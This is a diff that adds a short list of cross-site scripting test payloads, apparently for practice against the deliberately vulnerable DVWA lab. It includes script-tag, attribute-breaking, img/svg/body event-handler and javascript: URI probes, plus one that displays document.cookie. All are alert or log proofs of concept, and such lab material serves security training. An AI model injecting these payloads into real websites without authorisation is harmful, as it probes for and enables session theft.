@@ -1,0 +1,30 @@
+# =========================
+# DVWA XSS PAYLOADS
+# =========================
+
+# BASIC REFLECTED XSS
+<script>alert(1)</script>
+
+# BREAKING HTML CONTEXT
+"><script>alert(1)</script>
+
+# SINGLE QUOTE BREAK
+'><script>alert(1)</script>
+
+# IMAGE BASED XSS
+<img src=x onerror=alert(1)>
+
+# SVG XSS
+<svg onload=alert(1)>
+
+# BODY ONLOAD XSS
+<body onload=alert(1)>
+
+# SIMPLE JAVASCRIPT URI
+javascript:alert(1)
+
+# COOKIE TEST (SAFE DEMO ONLY)
+<script>alert(document.cookie)</script>
+
+# DOM STYLE XSS
+<script>console.log("XSS TEST")</script>
